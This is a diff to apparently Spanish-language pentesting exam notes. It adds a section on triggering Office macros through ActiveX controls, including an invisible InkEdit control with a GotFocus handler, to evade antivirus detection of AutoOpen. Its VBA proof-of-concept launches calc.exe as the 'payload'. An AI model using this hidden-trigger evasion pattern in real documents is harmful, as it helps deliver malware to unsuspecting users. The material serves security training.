@@ -719,14 +719,56 @@ End Sub
 #### Using ActiveX Controls for Macro Execution
 
 ```bash
+# Qué es ActiveX
+# Conjunto de tecnologías Microsoft para crear contenido interactivo en documentos Office
+# Permite insertar controles (botones, campos de texto, etc.) que ejecutan macros
+# Ventaja para evasión: evita usar AutoOpen() y Document_Open()
+# que son los entry points más detectados por AV
 
+# Por qué es útil en pentesting
+# Los AV buscan activamente Sub AutoOpen() y Sub Document_Open()
+# ActiveX permite ejecutar macros mediante interacción del usuario con el control
+# (click, foco, hover) — menos sospechoso para el AV
 
+# Ejemplo 1 — Botón ActiveX
+# Insertar → Controles → Botón → editar macro del botón
+Sub CommandButton1_Click()    ' se ejecuta al hacer click en el botón
+    MsgBox "ActiveX PoC"
+End Sub
 
+# Ejemplo 2 — Microsoft InkEdit Control
+# Insertar → Más controles → Microsoft InkEdit Control
+# El control no muestra nada visible — útil para ocultarlo en el documento
+
+Sub InkEdit1_GotFocus()       ' se ejecuta cuando el control recibe el foco
+    MsgBox "ActiveX PoC"      ' el usuario ni sabe que activó algo
+End Sub
+
+# Ejemplo 3 — Combinado con payload real
+# En lugar de AutoOpen(), el payload se dispara via ActiveX
+
+Sub calc()
+    Dim payload As String
+    payload = "calc.exe"
+    CreateObject("Wscript.Shell").Run payload, 1
+End Sub
+
+Sub InkEdit1_GotFocus()       ' cuando el control recibe foco → ejecuta payload
+    calc
+End Sub
+
+# Puntos clave para el examen
+# - ActiveX es una alternativa a AutoOpen/Document_Open para evadir AV
+# - GotFocus se dispara cuando el usuario hace click en cualquier parte del doc
+# - El control puede hacerse invisible para que el usuario no sospeche
+# - Combinar ActiveX + payload real = técnica efectiva de evasión
 ```
 
 #### Pretexting Phishing Documents
 
 ```bash
+
+
 ```
 
 #### HTML Applications (HTA)
